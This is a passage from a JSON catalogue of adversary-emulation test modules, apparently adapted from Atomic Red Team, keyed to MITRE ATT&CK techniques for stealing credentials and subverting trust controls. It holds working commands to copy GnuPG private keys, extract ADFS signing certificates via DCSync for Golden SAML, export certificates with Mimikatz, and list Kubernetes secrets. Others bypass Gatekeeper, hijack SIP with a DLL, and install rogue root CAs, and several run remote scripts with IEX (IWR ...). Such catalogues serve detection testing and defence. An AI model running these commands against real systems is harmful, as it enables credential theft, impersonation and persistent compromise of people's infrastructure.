      "rx_module_id": "2a5a0601-f5fb-4e2e-aa09-73282ae6afca",
      "module_name": "Copy the users GnuPG directory with rsync"
    },
    {
      "index": 1393,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Copy the users GnuPG (.gnupg) directory on a FreeBSD system to a staging folder using the `rsync` command.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "mkdir #{output_folder}\nfind #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\;\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf #{output_folder}\n"
      },
      "variables": [
        {
          "name": "search_path",
          "description": "Path where to start searching from",
          "type": "path",
          "default_value": "/"
        },
        {
          "name": "output_folder",
          "description": "Output folder containing a copy of the .gnupg directory",
          "type": "path",
          "default_value": "/tmp/GnuPG"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if rsync is installed.\n",
          "check_command": "if [ ! -x \"$(command -v rsync)\" ]; then exit 1; else exit 0; fi;\n",
          "install_command": "(which pkg && pkg install -y rsync)\n"
        }
      ],
      "rx_module_id": "b05ac39b-515f-48e9-88e9-2f141b5bcad0",
      "module_name": "Copy the users GnuPG directory with rsync (freebsd)"
    },
    {
      "index": 1394,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "AADInternals module must be installed.\n",
          "check_command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
          "install_command": "Install-Module -Name AADInternals -Force\n"
        }
      ],
      "rx_module_id": "78e95057-d429-4e66-8f82-0f060c1ac96f",
      "module_name": "ADFS token signing and encryption certificates theft - Local"
    },
    {
      "index": 1395,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "adfs_service_account_name",
          "description": "Name of the ADFS service account",
          "type": "string",
          "default_value": "adfs_svc"
        },
        {
          "name": "replication_user",
          "description": "Username with replication rights. It can be the Domain Admin running the script",
          "type": "string",
          "default_value": "Administrator"
        },
        {
          "name": "replication_password",
          "description": "Password of replication_username",
          "type": "string",
          "default_value": "ReallyStrongPassword"
        },
        {
          "name": "adfs_server_name",
          "description": "Name of an ADFS server",
          "type": "string",
          "default_value": "sts.contoso.com"
        }
      ],
      "prerequisites": [
        {
          "description": "AADInternals and ActiveDirectory modules must be installed.\n",
          "check_command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n",
          "install_command": "Install-Module -Name AADInternals -Force\n"
        }
      ],
      "rx_module_id": "cab413d8-9e4a-4b8d-9b84-c985bd73a442",
      "module_name": "ADFS token signing and encryption certificates theft - Remote"
    },
    {
      "index": 1396,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "The following RAGLOX test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this RAGLOX utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\nReference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "IEX (IWR 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}\n",
        "elevation_required": true,
        "cleanup_command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n"
      },
      "variables": [
        {
          "name": "output",
          "description": "file path to export to",
          "type": "path",
          "default_value": "c:\\temp\\raglox.pfx"
        },
        {
          "name": "password",
          "description": "password for cert",
          "type": "string",
          "default_value": "password"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "336b25bf-4514-4684-8924-474974f28137",
      "module_name": "CertUtil ExportPFX"
    },
    {
      "index": 1397,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$mypwd = ConvertTo-SecureString -String \"RAGLOXRedTeam\" -Force -AsPlainText\n$cert = New-SelfSignedCertificate -DnsName raglox.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nGet-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd\n",
        "elevation_required": true,
        "cleanup_command": "try {\n$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n} catch { }\n"
      },
      "variables": [
        {
          "name": "pfx_path",
          "description": "output path of the certificate",
          "type": "string",
          "default_value": "$env:Temp\\raglox.pfx"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7617f689-bbd8-44bc-adcd-6f8968897848",
      "module_name": "Export Root Certificate with Export-PFXCertificate"
    },
    {
      "index": 1398,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$cert = New-SelfSignedCertificate -DnsName raglox.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\n",
        "elevation_required": true,
        "cleanup_command": "try {\n   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n}\ncatch { }\n"
      },
      "variables": [
        {
          "name": "pfx_path",
          "description": "Path of the certificate",
          "type": "path",
          "default_value": "$env:Temp\\RAGLOXRedTeam.cer"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "78b274f8-acb0-428b-b1f7-7b0d0e73330a",
      "module_name": "Export Root Certificate with Export-Certificate"
    },
    {
      "index": 1399,
      "technique_id": "T1552.004",
      "technique_name": "Unsecured Credentials: Private Keys",
      "description": "The following RAGLOX test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\nA successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{mimikatz_exe}\" \"crypto::certificates /systemstore:local_machine /store:my /export\"  exit\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "mimikatz_exe",
          "description": "Path of the Mimikatz binary",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
          "check_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        }
      ],
      "rx_module_id": "290df60e-4b5d-4a5e-b0c7-dc5348ea0c86",
      "module_name": "Export Certificates with Mimikatz"
    },
    {
      "index": 1400,
      "technique_id": "T1552.005",
      "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
      "description": "This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. \nUpon successful execution, this test will scan all user attributes for any strings containing \"password\".\nThose unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. \nSee: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "import-module msonline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\n$users = Get-MsolUser -All;\nforeach($user in $users)\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \nforeach($prop in $props)\n{if($user.$prop -like \"*password*\")\n{(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}\nget-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue\n",
        "elevation_required": true,
        "cleanup_command": "remove-item $env:temp\\T1552.005Test1.txt -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": null
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "T1082Az"
        }
      ],
      "prerequisites": [
        {
          "description": "The MSOnline module must be installed.\n",
          "check_command": "if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}\n",
          "install_command": "install-module MSOnline\n"
        }
      ],
      "rx_module_id": "ae9b2e3e-efa1-4483-86e2-fae529ab9fb6",
      "module_name": "Azure - Search Azure AD User Attributes for Passwords"
    },
    {
      "index": 1401,
      "technique_id": "T1552.005",
      "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
      "description": "This test invokes a web request to the default Instance Metadata API of 169.254.169.254 in order to dump the data contained within it to a file. \nSee: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/\n",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "remove-item #{output_file} -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "File to output metadata to",
          "type": "string",
          "default_value": "$env:temp\\T1552.005Test2.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "cc99e772-4e18-4f1f-b422-c5cdd1bfd7b7",
      "module_name": "Azure - Dump Azure Instance Metadata from Virtual Machines"
    },
    {
      "index": 1402,
      "technique_id": "T1552.006",
      "technique_name": "Unsecured Credentials: Group Policy Preferences",
      "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Computer must be domain joined\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually\n"
        }
      ],
      "rx_module_id": "870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f",
      "module_name": "GPP Passwords (findstr)"
    },
    {
      "index": 1403,
      "technique_id": "T1552.006",
      "technique_name": "Unsecured Credentials: Group Policy Preferences",
      "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": ". \"#{gpp_script_path}\"\nGet-GPPPassword -Verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "gpp_script_url",
          "description": "URL of the Get-GPPPassword PowerShell Script",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1"
        },
        {
          "name": "gpp_script_path",
          "description": "Path to the Get-GPPPassword PowerShell Script",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1"
        }
      ],
      "prerequisites": [
        {
          "description": "Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}\n",
          "check_command": "if(Test-Path \"#{gpp_script_path}\") {exit 0 } else {exit 1 }\n",
          "install_command": "New-Item -ItemType Directory (Split-Path \"#{gpp_script_path}\") -Force | Out-Null\nInvoke-WebRequest #{gpp_script_url} -OutFile \"#{gpp_script_path}\"\n"
        },
        {
          "description": "Computer must be domain joined\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually\n"
        }
      ],
      "rx_module_id": "e9584f82-322c-474a-b831-940fd8b4455c",
      "module_name": "GPP Passwords (Get-GPPPassword)"
    },
    {
      "index": 1404,
      "technique_id": "T1552.007",
      "technique_name": "Kubernetes List Secrets",
      "description": "A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services or provide further access to the cluster.\n[More information about secrets](https://kubernetes.io/docs/concepts/configuration/secret/).\n\nThis test will make a request to the Kubernetes api at the `/api/v1/secrets` endpoint requesting every secret stored within the cluster.\n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "bash",
        "command": "kubectl get secrets --all-namespaces\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "kubectl must be installed\n",
          "check_command": "which kubectl\n",
          "install_command": "echo \"kubectl not installed, please install kubectl (https://kubernetes.io/docs/tasks/tools/)\"\n"
        }
      ],
      "rx_module_id": "31e794c4-48fd-4a76-aca4-6587c155bc11",
      "module_name": "List All Secrets"
    },
    {
      "index": 1405,
      "technique_id": "T1552.007",
      "technique_name": "Kubernetes List Secrets",
      "description": "A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services.\n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "bash",
        "command": "kubectl get secrets -n #{namespace}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "namespace",
          "description": "K8s namespace to list",
          "type": "string",
          "default_value": "default"
        }
      ],
      "prerequisites": [
        {
          "description": "kubectl must be installed\n",
          "check_command": "which kubectl\n",
          "install_command": "echo \"kubectl must be installed manually\"\n"
        }
      ],
      "rx_module_id": "43c3a49d-d15c-45e6-b303-f6e177e44a9a",
      "module_name": "ListSecrets"
    },
    {
      "index": 1406,
      "technique_id": "T1552.007",
      "technique_name": "Kubernetes List Secrets",
      "description": "Access the Kubernetes service account access token stored within a container in a cluster.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "kubectl --context kind-raglox-cluster exec raglox-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token\n",
        "elevation_required": false,
        "cleanup_command": "kubectl --context kind-raglox-cluster delete pod raglox-pod\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Verify docker is installed.",
          "check_command": "which docker\n",
          "install_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
        },
        {
          "description": "Verify docker service is running.",
          "check_command": "sudo systemctl status docker\n",
          "install_command": "sudo systemctl start docker\n"
        },
        {
          "description": "Verify kind is in the path.",
          "check_command": "which kind\n",
          "install_command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind\n"
        },
        {
          "description": "Verify kind-raglox-cluster is created",
          "check_command": "sudo kind get clusters\n",
          "install_command": "sudo kind create cluster --name raglox-cluster\n"
        },
        {
          "description": "Verify kubectl is in path",
          "check_command": "which kubectl\n",
          "install_command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl\n"
        },
        {
          "description": "Verify raglox-pod is running.",
          "check_command": "kubectl --context kind-raglox-cluster get pods |grep raglox-pod\n",
          "install_command": "kubectl --context kind-raglox-cluster run raglox-pod --image=alpine --command -- sleep infinity\n"
        }
      ],
      "rx_module_id": "788e0019-a483-45da-bcfe-96353d46820f",
      "module_name": "Cat the contents of a Kubernetes service account token file"
    },
    {
      "index": 1407,
      "technique_id": "T1553.001",
      "technique_name": "Subvert Trust Controls: Gatekeeper Bypass",
      "description": "Gatekeeper Bypass via command line\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "xattr -d com.apple.quarantine #{app_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "app_path",
          "description": "Path to app to be used",
          "type": "path",
          "default_value": "myapp.app"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "fb3d46c6-9480-4803-8d7d-ce676e1f1a9b",
      "module_name": "Gatekeeper Bypass"
    },
    {
      "index": 1408,
      "technique_id": "T1553.003",
      "technique_name": "Subvert Trust Controls: SIP and Trust Provider Hijacking",
      "description": "Registers a DLL that logs signature checks, mimicking SIP hijacking. This test uses a DLL from \nhttps://github.com/gtworek/PSBits/tree/master/SIP and registers it using regsvr32, thereby causing\nthe system to utilize it during signature checks, and logging said checks.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "regsvr32.exe #{dll_payload}\n",
        "elevation_required": true,
        "cleanup_command": "regsvr32.exe /u #{dll_payload}\n"
      },
      "variables": [
        {
          "name": "dll_payload",
          "description": "Path to GTSIPProvider.dll",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1553.003\\bin\\GTSIPProvider.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "GTSIPProvider.dll must exist on disk at specified location (#{dll_payload})\n",
          "check_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll\" -OutFile \"#{dll_payload}\"\n"
        }
      ],
      "rx_module_id": "e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675",
      "module_name": "SIP (Subject Interface Package) Hijacking via Custom DLL"
    },
    {
      "index": 1409,
      "technique_id": "T1553.004",
      "technique_name": "Subvert Trust Controls: Install Root Certificate",
      "description": "Creates a root CA with openssl\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /etc/pki/ca-trust/source/anchors/\nupdate-ca-trust\n",
        "elevation_required": true,
        "cleanup_command": "rm /etc/pki/ca-trust/source/anchors/#{cert_filename}\nupdate-ca-trust\n"
      },
      "variables": [
        {
          "name": "cert_filename",
          "description": "Path of the CA certificate we create",
          "type": "path",
          "default_value": "rootCA.crt"
        },
        {
          "name": "key_filename",
          "description": "Key we create that is used to create the CA certificate",
          "type": "path",
          "default_value": "rootCA.key"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "9c096ec4-fd42-419d-a762-d64cc950627e",
      "module_name": "Install root CA on CentOS/RHEL"
    },
    {
      "index": 1410,
      "technique_id": "T1553.004",
      "technique_name": "Subvert Trust Controls: Install Root Certificate",
      "description": "Creates a root CA with openssl\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /usr/local/share/certs/\ncertctl rehash\n",
        "elevation_required": true,
        "cleanup_command": "rm /usr/local/share/certs/#{cert_filename}\ncertctl rehash\n"
      },
      "variables": [
        {
          "name": "cert_filename",
          "description": "Path of the CA certificate we create",
          "type": "path",
          "default_value": "rootCA.crt"
        },
        {
          "name": "key_filename",
          "description": "Key we create that is used to create the CA certificate",
          "type": "path",
          "default_value": "rootCA.key"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f4568003-1438-44ab-a234-b3252ea7e7a3",
      "module_name": "Install root CA on FreeBSD"
    },
    {
      "index": 1411,
      "technique_id": "T1553.004",
      "technique_name": "Subvert Trust Controls: Install Root Certificate",
      "description": "Creates a root CA with openssl\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "mv #{cert_filename} /usr/local/share/ca-certificates\nsudo update-ca-certificates\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "cert_filename",
          "description": "CA file name",
          "type": "path",
          "default_value": "rootCA.crt"
        },
        {
          "name": "key_filename",
          "description": "Key we create that is used to create the CA certificate",
          "type": "path",
          "default_value": "rootCA.key"
        }
      ],
      "prerequisites": [
        {
          "description": "Verify the certificate exists. It generates if not on disk.\n",
          "check_command": "if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n"
        }
      ],
      "rx_module_id": "53bcf8a0-1549-4b85-b919-010c56d724ff",
      "module_name": "Install root CA on Debian/Ubuntu"
    },
    {
      "index": 1412,
      "technique_id": "T1553.004",
      "technique_name": "Subvert Trust Controls: Install Root Certificate",
      "description": "Creates a root CA with openssl\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"#{cert_filename}\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "cert_filename",
          "description": "CA file name",
          "type": "path",
          "default_value": "rootCA.crt"
        },
        {
          "name": "key_filename",
          "description": "Key we create that is used to create the CA certificate",
          "type": "path",
          "default_value": "rootCA.key"
        }
      ],
      "prerequisites": [
        {
          "description": "Verify the certificate exists. It generates if not on disk.\n",
          "check_command": "if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n"
        }
      ],
      "rx_module_id": "cc4a0b8c-426f-40ff-9426-4e10e5bf4c49",
      "module_name": "Install root CA on macOS"
    },
    {
      "index": 1413,
      "technique_id": "T1553.004",
      "technique_name": "Subvert Trust Controls: Install Root Certificate",
      "description": "Creates a root CA with Powershell\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nMove-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"\n",
        "elevation_required": true,
        "cleanup_command": "try {\n   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n}\ncatch { }\n"
      },
      "variables": [
        {
          "name": "pfx_path",
          "description": "Path of the certificate",
          "type": "path",
          "default_value": "rootCA.cer"
        }
      ],
      "prerequisites": [
        {
          "description": "Verify the certificate exists. It generates if not on disk.\n",
          "check_command": "if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }\n",
